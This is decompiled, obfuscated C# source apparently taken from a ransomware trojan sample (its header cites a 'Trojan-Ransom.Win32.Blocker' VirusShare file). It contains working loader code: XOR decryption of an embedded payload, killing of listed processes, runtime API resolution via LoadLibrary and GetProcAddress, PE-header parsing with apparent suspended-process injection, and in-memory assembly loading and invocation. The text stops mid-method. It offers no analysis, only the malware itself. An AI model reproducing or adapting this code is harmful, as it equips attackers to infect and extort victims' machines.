// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴅ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using SmartAssembly.Attributes;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Ⴈ
{
  [StandardModule]
  internal sealed class Ⴅ
  {
    public static byte[] Ⴗ(byte[] Ⴅ, float Ⴃ, ulong Ⴓ, string Ⴐ)
    {
      int num1;
      byte[] numArray1;
      byte[] numArray2;
      int length;
      Decimal limit;
      Decimal count;
      int num2;
      int index;
      byte[] numArray3;
      byte[] numArray4;
      object[] objArray;
      try
      {
        try
        {
          num1 = 13;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 9:
                num2 = checked (Ⴅ.Length - 1);
                index = 0;
                num1 = 2;
                continue;
              case 1:
                Ⴅ[index] = (byte) ((int) Ⴅ[index] ^ (int) numArray2[index % length]);
                num1 = 6;
                continue;
              case 2:
                num1 = index <= num2 ? 1 : 12;
                continue;
              case 3:
                numArray1[8] = (byte) 21;
                numArray1[9] = (byte) 93;
                numArray1[10] = (byte) 219;
                num1 = 10;
                continue;
              case 4:
                goto label_17;
              case 5:
                numArray1[5] = (byte) 34;
                numArray1[6] = (byte) 130;
                numArray1[7] = (byte) 158;
                num1 = 3;
                continue;
              case 6:
                checked { ++index; }
                num1 = 2;
                continue;
              case 7:
                numArray1[0] = (byte) 19;
                numArray1[1] = (byte) 135;
                num1 = 14;
                continue;
              case 8:
                num1 = ObjectFlowControl.ForLoopControl.ForNextCheckDec(count, limit, 1M) ? 11 : 9;
                continue;
              case 10:
                numArray1[11] = (byte) 238;
                numArray1[12] = (byte) 126;
                numArray1[13] = (byte) 211;
                num1 = 15;
                continue;
              case 11:
                count = SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴃ(count, 1M, 1011, 945);
                num1 = 8;
                continue;
              case 12:
                goto label_15;
              case 14:
                numArray1[2] = (byte) 157;
                numArray1[3] = (byte) 239;
                numArray1[4] = (byte) 154;
                num1 = 5;
                continue;
              case 15:
                numArray2 = numArray1;
                length = numArray2.Length;
                limit = 125M;
                count = 19M;
                num1 = 8;
                continue;
              default:
                numArray1 = new byte[14];
                goto case 7;
            }
          }
label_15:
          numArray3 = Ⴅ;
          numArray4 = numArray3;
        }
        catch (Exception ex)
        {
          byte[] numArray5;
          objArray = new object[12]
          {
            (object) numArray5,
            (object) numArray2,
            (object) length,
            (object) count,
            (object) index,
            (object) numArray1,
            (object) limit,
            (object) num2,
            (object) Ⴅ,
            (object) Ⴃ,
            (object) Ⴓ,
            (object) Ⴐ
          };
          object[] objects = objArray;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
label_17:
        switch (2)
        {
          default:
            return numArray4;
        }
      }
      catch (Exception ex)
      {
        int num3;
        object[] objects = new object[16]
        {
          (object) numArray3,
          (object) numArray2,
          (object) length,
          (object) count,
          (object) index,
          (object) numArray1,
          (object) limit,
          (object) num2,
          (object) objArray,
          (object) numArray4,
          (object) num1,
          (object) num3,
          (object) Ⴅ,
          (object) Ⴃ,
          (object) Ⴓ,
          (object) Ⴐ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static string Ⴄ(double Ⴃ, int Ⴅ, Decimal Ⴍ, string Ⴗ, long Ⴐ, string Ⴓ)
    {
      int num1;
      bool flag;
      long num2;
      string str1;
      string str2;
      try
      {
        try
        {
          num1 = 2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                checked { ++num2; }
                num1 = num2 <= 28L ? 0 : 9;
                continue;
              case 1:
                num2 = 17L;
                num1 = 0;
                continue;
              case 3:
                num1 = !flag ? 9 : 1;
                continue;
              case 4:
                str1 = SendingReportFeedbackEventArgs1.Ⴐ(ႷႼ.Ⴗ(793, 836), Ⴈ.Ⴅ.Ⴗ(AppRegistryKeys.Ⴀ(Ⴗ, 690, 666), -20015.9082f, 133212878UL, ႳႷ.Ⴗ(2059790409, 3)), 565, 524);
                num1 = 8;
                continue;
              case 8:
                goto label_8;
              case 9:
                num1 = false ? 4 : 4;
                continue;
              default:
                flag = true;
                goto case 3;
            }
          }
label_8:
          str2 = str1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          string o2 = str1;
          // ISSUE: variable of a boxed type
          __Boxed<long> o3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<double> o4 = (ValueType) Ⴃ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴅ;
          // ISSUE: variable of a boxed type
          __Boxed<Decimal> o6 = (ValueType) Ⴍ;
          string o7 = Ⴗ;
          // ISSUE: variable of a boxed type
          __Boxed<long> o8 = (ValueType) Ⴐ;
          string o9 = Ⴓ;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9);
          throw;
        }
        switch (3)
        {
          default:
            return str2;
        }
      }
      catch (Exception ex)
      {
        int num3;
        object[] objects = new object[12]
        {
          (object) flag,
          (object) str1,
          (object) num2,
          (object) str2,
          (object) num1,
          (object) num3,
          (object) Ⴃ,
          (object) Ⴅ,
          (object) Ⴍ,
          (object) Ⴗ,
          (object) Ⴐ,
          (object) Ⴓ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static void Ⴗ()
    {
      int num1;
      int num2;
      int num3;
      int num4;
      char[] chArray1;
      string[] strArray;
      int index1;
      Process[] processArray;
      int index2;
      Process process;
      int num5;
      int num6;
      try
      {
        try
        {
          num1 = 0;
          switch (num1)
          {
            default:
label_1:
              try
              {
                num2 = 17;
label_2:
                while (true)
                {
                  int num7;
                  int num8;
                  switch (num2)
                  {
                    case 0:
                      num7 = num3;
                      goto label_32;
                    case 1:
                      goto label_29;
                    case 2:
                      num4 = 4;
                      processArray = AutoHeightLabel.Ⴅ(strArray[index1], 49, 50);
                      num2 = 21;
                      continue;
                    case 3:
                      num8 = num5;
                      break;
                    case 4:
                    case 12:
                      num4 = 6;
                      num2 = 7;
                      continue;
                    case 5:
                      goto label_43;
                    case 6:
                      num4 = 7;
                      checked { ++index1; }
                      num2 = index1 <= 11 ? 2 : 5;
                      continue;
                    case 7:
                      num2 = index2 < processArray.Length ? 14 : 6;
                      continue;
                    case 8:
                      num3 = -2;
                      num2 = 18;
                      continue;
                    case 9:
                    case 20:
                      num4 = 3;
                      index1 = 0;
                      num2 = 2;
                      continue;
                    case 10:
                      num8 = num5 + 1;
                      break;
                    case 11:
                    case 16:
                      goto label_40;
                    case 13:
                      num7 = 1;
                      goto label_32;
                    case 14:
                      process = processArray[index2];
                      num2 = 15;
                      continue;
                    case 15:
                      num4 = 5;
                      PoweredBy.Ⴄ(process, 218, 187);
                      checked { ++index2; }
                      num2 = 4;
                      continue;
                    case 18:
                      num4 = 2;
                      string str = Ⴈ.Ⴅ.Ⴄ(670.7, 416407755, 100488684M, MyComputer.Ⴗ(834542700, 2), 1688342099L, ႷႭ.ႥႭ(490613624, 6));
                      chArray1 = new char[1]
                      {
                        UnhandledExceptionHandlerWithUI.Ⴓ(Ⴈ.Ⴅ.Ⴄ(4970.616, 698393177, 0M, Ⴈ.Ⴀ.Ⴐ(1468303796, 6), -56950068L, MyComputer.Ⴗ(834542592, 1)), 709, 722)
                      };
                      char[] chArray2 = chArray1;
                      strArray = SendingReportFeedbackEventArgs1.Ⴀ(str, chArray2, 970, 983);
                      num2 = 9;
                      continue;
                    case 21:
                      index2 = 0;
                      num2 = 7;
                      continue;
                    default:
                      UsageReportSender.Ⴅ(570, 618);
                      goto case 8;
                  }
                  num5 = 0;
                  int num9;
                  switch (num8)
                  {
                    case 0:
                      num9 = 16;
                      break;
                    case 1:
                      goto label_1;
                    case 2:
                      num9 = 18;
                      break;
                    case 3:
                      num9 = 9;
                      break;
                    case 4:
                      num9 = 2;
                      break;
                    case 5:
                      num9 = 15;
                      break;
                    case 6:
                      num9 = 4;
                      break;
                    case 7:
                      num9 = 6;
                      break;
                    case 8:
                      num9 = 5;
                      break;
                    default:
                      num9 = 16;
                      break;
                  }
                  num2 = num9;
                  continue;
label_32:
                  int num10;
                  switch (num7)
                  {
                    case 0:
                      num10 = 11;
                      break;
                    case 1:
                      num10 = 10;
                      break;
                    default:
                      num10 = 11;
                      break;
                  }
                  num2 = num10;
                }
label_29:
                num5 = num4;
                num2 = num3 > -2 ? 0 : 13;
                goto label_2;
              }
              catch (Exception ex) when (ex is Exception & num3 != 0 & num5 == 0)
              {
                SimpleZip.ႤႼ.Ⴄ(ex, 205, 171);
                goto label_29;
              }
label_40:
              num6 = 1;
label_41:
              switch (num6)
              {
                case 0:
                case 7:
                  ProjectData.ClearProjectError();
                  goto label_47;
                case 2:
                case 3:
                case 4:
                  break;
                case 6:
                  goto label_47;
                default:
                  throw ႷႼ.Ⴄ(-2146828237, 370, 257);
              }
label_43:
              num6 = num5 == 0 ? 6 : 7;
              goto label_41;
          }
        }
        catch (Exception ex)
        {
          string[] o1 = strArray;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) index1;
          Process o3 = process;
          char[] o4 = chArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) index2;
          Process[] o6 = processArray;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o9 = (ValueType) num4;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9);
          throw;
        }
label_47:
        switch (0)
        {
        }
      }
      catch (Exception ex)
      {
        int num11;
        object[] objects = new object[13]
        {
          (object) strArray,
          (object) index1,
          (object) process,
          (object) chArray1,
          (object) index2,
          (object) processArray,
          (object) num3,
          (object) num5,
          (object) num4,
          (object) num1,
          (object) num2,
          (object) num6,
          (object) num11
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static int Ⴅ(int Ⴃ, short Ⴓ, byte[] Ⴄ, ushort Ⴐ)
    {
      int num1;
      bool flag;
      Color color;
      int num2;
      int num3;
      try
      {
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 3:
              case 6:
                goto label_4;
              case 5:
                color = PoweredByAttribute.Ⴈ((int) Ⴄ[checked (Ⴃ + 3)], (int) Ⴄ[checked (Ⴃ + 2)], (int) Ⴄ[checked (Ⴃ + 1)], (int) Ⴄ[Ⴃ], 822, 786);
                num1 = 3;
                continue;
              default:
                flag = true;
                num1 = !flag ? 5 : 5;
                continue;
            }
          }
label_4:
          num2 = Ⴈ.Ⴓ.Ⴃ(ref color, 939, 982);
          num3 = num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<Color> o3 = (ValueType) color;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) Ⴃ;
          // ISSUE: variable of a boxed type
          __Boxed<short> o5 = (ValueType) Ⴓ;
          byte[] o6 = Ⴄ;
          // ISSUE: variable of a boxed type
          __Boxed<ushort> o7 = (ValueType) Ⴐ;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
          throw;
        }
        switch (1)
        {
          default:
            return num3;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> o1 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<Color> o3 = (ValueType) color;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num1;
        int num5;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num5;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) Ⴃ;
        // ISSUE: variable of a boxed type
        __Boxed<short> o8 = (ValueType) Ⴓ;
        byte[] o9 = Ⴄ;
        // ISSUE: variable of a boxed type
        __Boxed<ushort> o10 = (ValueType) Ⴐ;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9, (object) o10);
        throw;
      }
    }

    public static byte[] Ⴀ(int Ⴅ)
    {
      int num1;
      long num2;
      bool flag1;
      float num3;
      DateTime dateTime;
      bool flag2;
      double num4;
      Color color;
      byte[] numArray1;
      byte[] numArray2;
      byte[] numArray3;
      try
      {
        try
        {
          num1 = 3;
          while (true)
          {
            switch (num1)
            {
              case 0:
                color = SimpleZip.ႤႷ.Ⴈ(Ⴅ, 752, 646);
                numArray1 = new byte[4];
                num1 = 11;
                continue;
              case 1:
                num4 = 18.0;
                num1 = 4;
                continue;
              case 2:
              case 5:
                flag2 = true;
                num1 = !flag2 ? 0 : 1;
                continue;
              case 4:
                ++num4;
                num1 = num4 <= 118.0 ? 4 : 0;
                continue;
              case 6:
                goto label_14;
              case 7:
                ++num3;
                num1 = 12;
                continue;
              case 8:
                numArray1[2] = AppNameFinder.Ⴐ(ref color, 539, 569);
                numArray1[3] = DoNotDistributeAttribute.Ⴓ(ref color, 998, 1016);
                goto case 9;
              case 9:
                num1 = 6;
                continue;
              case 10:
                dateTime = UsageReportSender.Ⴈ(681, 699);
                goto case 7;
              case 11:
                numArray1[0] = SendingReportFeedbackEventArgs.Ⴓ(ref color, 627, 517);
                numArray1[1] = SendingReportFeedbackEventArgs.Ⴓ(ref color, 475, 428);
                num1 = 8;
                continue;
              case 12:
                num1 = (double) num3 <= 75.0 ? 10 : 13;
                continue;
              case 13:
                num1 = !flag1 ? 5 : 5;
                continue;
              default:
                num2 = 338981721L;
                flag1 = true;
                num3 = 15f;
                num1 = 10;
                continue;
            }
          }
label_14:
          numArray2 = numArray1;
          numArray3 = numArray2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag2;
          // ISSUE: variable of a boxed type
          __Boxed<Color> o2 = (ValueType) color;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o3 = (ValueType) flag1;
          // ISSUE: variable of a boxed type
          __Boxed<long> o4 = (ValueType) num2;
          byte[] numArray4;
          byte[] o5 = numArray4;
          // ISSUE: variable of a boxed type
          __Boxed<float> o6 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<DateTime> o7 = (ValueType) dateTime;
          // ISSUE: variable of a boxed type
          __Boxed<double> o8 = (ValueType) num4;
          byte[] o9 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o10 = (ValueType) Ⴅ;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9, (object) o10);
          throw;
        }
        switch (1)
        {
          default:
            return numArray3;
        }
      }
      catch (Exception ex)
      {
        int num5;
        object[] objects = new object[13]
        {
          (object) flag2,
          (object) color,
          (object) flag1,
          (object) num2,
          (object) numArray2,
          (object) num3,
          (object) dateTime,
          (object) num4,
          (object) numArray1,
          (object) numArray3,
          (object) num1,
          (object) num5,
          (object) Ⴅ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
    public static extern IntPtr Ⴄ(string Ⴃ);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    public static extern IntPtr Ⴈ(IntPtr Ⴃ, string Ⴄ);

    public static hjqr Ⴄ<hjqr>(string Ⴗ)
    {
      int num1;
      ushort num2;
      uint num3;
      long num4;
      ulong num5;
      bool flag;
      double num6;
      string str1;
      int num7;
      int num8;
      char ch;
      long num9;
      char[] chArray1;
      char[] chArray2;
      hjqr genericParameter;
      hjqr hjqr;
      object[] objArray;
      try
      {
        try
        {
          num1 = 13;
          while (true)
          {
            switch (num1)
            {
              case 0:
                checked { ++num2; }
                num1 = num2 <= (ushort) 74 ? 3 : 9;
                continue;
              case 2:
                num4 = 6L;
                num1 = 4;
                continue;
              case 3:
                num3 = 11U;
                num1 = 2;
                continue;
              case 4:
                checked { ++num4; }
                num1 = num4 <= 49L ? 4 : 10;
                continue;
              case 5:
                num9 = 644892253L;
                goto case 0;
              case 6:
                num6 = 3012.9;
                str1 = MyComputer.Ⴗ(834542623, 1);
                num7 = 0;
                num8 = AppPathFinder.Ⴐ(str1, 662, 673);
                num1 = 7;
                continue;
              case 7:
                num1 = num7 < num8 ? 16 : 8;
                continue;
              case 8:
                checked { ++num3; }
                num1 = num3 <= 55U ? 2 : 5;
                continue;
              case 9:
                string str2 = Ⴗ;
                chArray1 = new char[1]{ Ⴈ.Ⴐ.Ⴍ(58, 422, 401) };
                char[] chArray3 = chArray1;
                IntPtr Ⴃ = Ⴈ.Ⴅ.Ⴄ(SendingReportFeedbackEventArgs1.Ⴀ(str2, chArray3, 191, 162)[0]);
                string str3 = Ⴗ;
                chArray2 = new char[1]{ Ⴈ.Ⴐ.Ⴍ(58, 623, 600) };
                char[] chArray4 = chArray2;
                string Ⴄ = SendingReportFeedbackEventArgs1.Ⴀ(str3, chArray4, 111, 114)[1];
                // ISSUE: type reference
                genericParameter = Conversions.ToGenericParameter<hjqr>((object) \u003CPrivateImplementationDetails\u003E.Ⴅ(Ⴈ.Ⴅ.Ⴈ(Ⴃ, Ⴄ), SendingReportFeedbackEventArgs1.Ⴍ(__typeref (hjqr), 391, 508), 490, 385));
                goto case 14;
              case 10:
                num5 = 0UL;
                num1 = 15;
                continue;
              case 11:
                checked { ++num5; }
                num1 = num5 <= 109UL ? 15 : 6;
                continue;
              case 12:
              case 17:
                goto label_17;
              case 14:
                num1 = 17;
                continue;
              case 15:
                flag = true;
                num1 = !flag ? 11 : 11;
                continue;
              case 16:
                ch = ႳႷ.Ⴀ(str1, num7, 1013, 924);
                checked { ++num7; }
                num1 = 7;
                continue;
              default:
                num2 = (ushort) 19;
                num1 = 3;
                continue;
            }
          }
label_17:
          hjqr = genericParameter;
        }
        catch (Exception ex)
        {
          objArray = new object[15]
          {
            (object) genericParameter,
            (object) num9,
            (object) num2,
            (object) num3,
            (object) num6,
            (object) num4,
            (object) flag,
            (object) num5,
            (object) ch,
            (object) num7,
            (object) str1,
            (object) num8,
            (object) chArray1,
            (object) chArray2,
            (object) Ⴗ
          };
          object[] objects = objArray;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
        switch (2)
        {
          default:
            return hjqr;
        }
      }
      catch (Exception ex)
      {
        int num10;
        object[] objects = new object[19]
        {
          (object) genericParameter,
          (object) num9,
          (object) num2,
          (object) num3,
          (object) num6,
          (object) num4,
          (object) flag,
          (object) num5,
          (object) ch,
          (object) num7,
          (object) str1,
          (object) num8,
          (object) chArray1,
          (object) chArray2,
          (object) objArray,
          (object) hjqr,
          (object) num1,
          (object) num10,
          (object) Ⴗ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static void Ⴅ(object Ⴗ)
    {
      int num1;
      bool flag1;
      MethodInfo methodInfo1;
      string str;
      int num2;
      int num3;
      char ch;
      bool flag2;
      object[] objArray1;
      try
      {
        try
        {
          num1 = 10;
          while (true)
          {
            switch (num1)
            {
              case 0:
                MethodInfo methodInfo2 = methodInfo1;
                objArray1 = new object[1]
                {
                  (object) new string[0]
                };
                object[] objArray2 = objArray1;
                ႷႤ.Ⴐ((MethodBase) methodInfo2, (object) null, objArray2, 318, 288);
                num1 = 9;
                continue;
              case 1:
                num1 = 2;
                continue;
              case 2:
                methodInfo1 = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴐ(UnhandledExceptionHandlerWithUI.Ⴅ((byte[]) Ⴗ, 601, 553), 208, 191);
                goto case 11;
              case 3:
                str = Ⴈ.Ⴀ.Ⴐ(1468303802, 7);
                num2 = 0;
                num3 = AppPathFinder.Ⴐ(str, 445, 394);
                num1 = 4;
                continue;
              case 4:
                num1 = num2 < num3 ? 8 : 7;
                continue;
              case 5:
              case 9:
                goto label_15;
              case 7:
                flag2 = false;
                num1 = ႷႭ.ႰႠ((MethodBase) methodInfo1, 152, 190).Length != 0 ? 0 : 14;
                continue;
              case 8:
                ch = ႳႷ.Ⴀ(str, num2, 554, 579);
                checked { ++num2; }
                num1 = 4;
                continue;
              case 11:
                num1 = 3;
                continue;
              case 12:
                num1 = true ? 1 : 1;
                continue;
              case 14:
                ႷႤ.Ⴐ((MethodBase) methodInfo1, (object) null, (object[]) null, 996, 1018);
                num1 = 9;
                continue;
              default:
                flag1 = false;
                num1 = !flag1 ? 2 : 12;
                continue;
            }
          }
        }
        catch (Exception ex)
        {
          MethodInfo o1 = methodInfo1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o2 = (ValueType) flag1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o3 = (ValueType) flag2;
          // ISSUE: variable of a boxed type
          __Boxed<char> o4 = (ValueType) ch;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num2;
          string o6 = str;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num3;
          object[] o8 = objArray1;
          object o9 = Ⴗ;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, o9);
          throw;
        }
label_15:
        switch (1)
        {
        }
      }
      catch (Exception ex)
      {
        int num4;
        object[] objects = new object[11]
        {
          (object) methodInfo1,
          (object) flag1,
          (object) flag2,
          (object) ch,
          (object) num2,
          (object) str,
          (object) num3,
          (object) objArray1,
          (object) num1,
          (object) num4,
          Ⴗ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public static void Ⴗ(float Ⴅ, ushort Ⴈ, sbyte Ⴍ, sbyte Ⴃ, byte[] Ⴗ, ulong Ⴀ)
    {
      int num1;
      int num2;
      bool flag1;
      ushort num3;
      byte num4;
      short num5;
      Thread thread;
      byte num6;
      int num7;
      string Ⴀ1;
      string[] strArray;
      int index;
      string str1;
      byte[] numArray1;
      byte[] numArray2;
      int[] numArray3;
      int[] numArray4;
      int num8;
      int num9;
      bool flag2;
      IntPtr Ⴐ1;
      IntPtr[] Ⴜ;
      IntPtr num10;
      int num11;
      uint[] Ⴈ1;
      IntPtr num12;
      IntPtr Ⴃ1;
      IntPtr num13;
      IntPtr Ⴄ1;
      IntPtr num14;
      IntPtr num15;
      IntPtr Ⴍ1;
      Ⴈ.Ⴅ.Ⴈ ⴈ1;
      bool flag3;
      int[] numArray5;
      int num16;
      int num17;
      byte[] numArray6;
      int length;
      string str2;
      uint num18;
      int num19;
      object[] objArray;
      try
      {
        try
        {
          num1 = 31;
          while (true)
          {
            switch (num1)
            {
              case 0:
                checked { ++index; }
                num1 = 30;
                continue;
              case 1:
                numArray3[6] = 4;
                num1 = 3;
                continue;
              case 2:
                str1 = strArray[index];
                num1 = !AppNameFinder.Ⴓ(DoNotPruneTypeAttribute.Ⴗ(str1, 104, 8), Ⴈ.Ⴅ.Ⴄ(13320.1535, 1393893100, 1010445655M, Ⴈ.Ⴀ.Ⴐ(1468303747, 2), 1907931065L, (string) null), 555, 621) ? 0 : 11;
                continue;
              case 3:
                numArray3[7] = 64;
                numArray4 = numArray3;
                num8 = Ⴈ.Ⴅ.Ⴅ(60, (short) 13308, Ⴗ, (ushort) 2179);
                num1 = 16;
                continue;
              case 4:
                goto label_72;
              case 5:
                numArray3[4] = 4;
                numArray3[5] = 64;
                goto case 1;
              case 6:
                strArray = SmartAssembly.SmartExceptionsCore.StackFrameHelper.Ⴓ(ႷႭ.ႰႨ(HeaderControl.Ⴄ(ႳႷ.Ⴀ(SimpleZip.ႤႷ.Ⴄ(365, 262), 0, 151, 254), 568, 638), Ⴈ.Ⴅ.Ⴄ(25208.6, 769304218, 1640571858M, SimpleZip.Ⴓ(661403070, 8), 981349592L, ႳႷ.Ⴗ(2059790431, 3)), 33, 19), 592, 548);
                num1 = 13;
                continue;
              case 7:
                checked { ++num7; }
                num1 = 24;
                continue;
              case 8:
                num1 = Ⴗ[60] != (byte) 128 ? 21 : 35;
                continue;
              case 9:
                num1 = num2 <= 100 ? 37 : 8;
                continue;
              case 10:
                Ⴐ1 = new IntPtr(Ⴈ.Ⴅ.Ⴅ(checked (num8 + 84), (short) 28033, Ⴗ, (ushort) 12428));
                num1 = 26;
                continue;
              case 11:
                Ⴀ1 = ႷႭ.ႰႨ(str1, Ⴈ.Ⴅ.Ⴄ(0.0, 860220632, -803707391M, ႷႭ.ႥႭ(490613574, 6), 2029779096L, SimpleZip.Ⴓ(661403037, 4)), 808, 794);
                num1 = 15;
                continue;
              case 12:
                num1 = !Ⴈ.Ⴗ.Ⴓ(ႷႭ.ႰႨ(HeaderControl.Ⴄ(ႳႷ.Ⴀ(SimpleZip.ႤႷ.Ⴄ(532, 639), 0, 611, 522), 842, 780), Ⴈ.Ⴅ.Ⴄ(0.0, 1802622029, -544403270M, ႷႭ.ႥႳ(1491049163, 8), 0L, ႳႷ.Ⴗ(2059790407, 8)), 681, 667), 993, 997) ? 20 : 6;
                continue;
              case 13:
                index = 0;
                num1 = 30;
                continue;
              case 14:
                checked { ++num6; }
                num1 = num6 <= (byte) 20 ? 36 : 34;
                continue;
              case 15:
                num1 = 20;
                continue;
              case 16:
                num9 = (int) SecurityExceptionEventArgs.Ⴜ(Ⴗ, checked (num8 + 6), 69, 51);
                flag2 = false;
                num1 = 10;
                continue;
              case 17:
                thread = new Thread(new ParameterizedThreadStart(Ⴈ.Ⴅ.Ⴅ));
                SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴈ(thread, ApartmentState.STA, 197, 174);
                num1 = 18;
                continue;
              case 18:
                num6 = (byte) 0;
                num1 = 36;
                continue;
              case 20:
                numArray1 = new byte[6]
                {
                  (byte) 0,
                  (byte) 1,
                  (byte) 0,
                  (byte) 0,
                  (byte) 0,
                  (byte) 0
                };
                num1 = 28;
                continue;
              case 21:
              case 29:
                Ⴀ1 = DESCryptoIndirector.Ⴍ(DoNotDistributeAttribute.Ⴄ(1022, 911), 231, 134);
                num1 = 12;
                continue;
              case 22:
                goto label_37;
              case 23:
                num1 = 14;
                continue;
              case 24:
                num1 = num7 <= 30 ? 33 : 14;
                continue;
              case 25:
                num3 = (ushort) 31875;
                num4 = checked ((byte) num2);
                checked { ++num2; }
                num1 = 9;
                continue;
              case 26:
                Ⴜ = new IntPtr[4];
                flag2 = true;
                num1 = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴓ>(Ⴈ.Ⴅ.Ⴄ(-11800.0, 2002489458, 1744272669M, MyComputer.Ⴗ(834542612, 1), 247093004L, ႷႭ.ႥႭ(490613597, 0)))((string) null, Ⴀ1, num10, num10, false, 4, num10, (string) null, new byte[0], Ⴜ) ? 22 : 4;
                continue;
              case 27:
                numArray3[1] = 16;
                numArray3[2] = 2;
                numArray3[3] = 32;
                num1 = 5;
                continue;
              case 28:
                numArray1[2] = (byte) 2;
                numArray1[3] = (byte) 3;
                numArray1[4] = (byte) 4;
                num1 = 32;
                continue;
              case 30:
                num1 = index < strArray.Length ? 2 : 20;
                continue;
              case 32:
                numArray1[5] = (byte) 5;
                numArray2 = numArray1;
                numArray3 = new int[8];
                numArray3[0] = 1;
                num1 = 27;
                continue;
              case 33:
                num1 = num7 != 25 ? 7 : 23;
                continue;
              case 34:
                goto label_16;
              case 35:
                num5 = (short) 2302;
                goto case 17;
              case 36:
                num7 = (int) num6;
                num1 = 24;
                continue;
              case 37:
                flag1 = true;
                num1 = !flag1 ? 25 : 25;
                continue;
              default:
                num2 = 0;
                num1 = 37;
                continue;
            }
          }
label_16:
          AppRegistryKeys.Ⴄ(thread, (object) Ⴗ, 283, 308);
          goto label_69;
label_37:
          try
          {
            num11 = 11;
            while (true)
            {
              switch (num11)
              {
                case 0:
